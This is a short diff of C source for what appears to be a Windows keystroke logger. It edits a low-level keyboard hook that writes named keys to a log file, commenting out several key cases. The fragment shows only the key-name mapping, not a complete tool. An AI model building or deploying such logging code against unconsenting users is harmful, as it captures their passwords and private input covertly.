@@ -100,18 +100,22 @@ LRESULT CALLBACK LowLevelKeyboardProc(INT code, WPARAM wParam, LPARAM lParam)
 			{
 				switch (vkey)
 				{
+				/*
 				case VK_CANCEL:
 					fputs("[ctrl+break]", kbpFile);
 					break;
+				*/
 				case VK_MBUTTON:
 					fputs("[middle-mouse]", kbpFile);
 					break;
+				/*
 				case VK_XBUTTON1:
 					fputs("[x1-mouse]", kbpFile);
 					break;
 				case VK_XBUTTON2:
 					fputs("[x2-mouse]", kbpFile);
 					break;
+				*/
 				case VK_BACK:
 					fputs("[back]", kbpFile);
 					break;
@@ -136,6 +140,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(INT code, WPARAM wParam, LPARAM lParam)
 				case VK_CAPITAL:
 					fputs("[caps]", kbpFile);
 					break;
+				/*
 				case VK_KANA:
 					fputs("[kana/hangul mode]", kbpFile);
 					break;
@@ -148,6 +153,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(INT code, WPARAM wParam, LPARAM lParam)
 				case VK_HANJA:
 					fputs("[kanji/hanja mode]", kbpFile);
 					break;
+				*/
 				case VK_ESCAPE:
 					fputs("[esc]", kbpFile);
 					break;
